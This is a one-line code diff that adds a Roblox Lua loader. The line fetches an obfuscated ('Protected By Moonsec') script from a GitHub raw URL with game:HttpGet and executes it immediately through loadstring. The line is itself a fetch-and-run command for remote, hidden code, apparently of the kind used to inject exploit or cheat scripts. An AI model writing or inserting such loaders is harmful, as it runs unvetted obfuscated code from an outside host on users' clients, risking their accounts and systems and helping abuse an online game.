@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NullProtector/NullProtector.github.io/main/Osy%20%7BProtected%20By%20Moonsec%5D"))()
